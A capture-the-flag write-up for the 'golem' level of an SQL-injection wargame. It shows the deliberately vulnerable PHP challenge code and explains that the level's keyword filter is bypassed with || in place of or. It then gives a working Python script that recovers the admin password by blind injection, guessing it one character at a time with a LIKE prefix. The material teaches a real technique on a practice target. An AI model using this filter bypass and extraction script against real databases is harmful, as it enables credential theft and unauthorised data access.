# golem

----------

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and|substr\(|=/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_golem where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_golem where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("golem"); 
  highlight_file(__FILE__); 
?>
```

Here we have to get the password using blind sql injection and give that as the value to solve the level but here we can't use `or` or `and`

We have to use `||` instead of `or` and `&&` instead of `and`

So I made a script to do that

```python
import requests
import string

session = requests.Session()

url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=' || pw like '{}%"
cookies = {"PHPSESSID": "t2olebiumhrkeldqqkd0g2c5q0"}
pw = ""
for j in range(10):
    for i in string.printable:
        r = requests.get(url.format(pw+i), cookies=cookies)
        if('Hello admin' in r.text[:200] and i not in "#%&"):
            pw += i
            print("Password :", pw)
            break

print("Password :", pw)
```

This gave the password as `` and giving that as the value of pw solved the level.
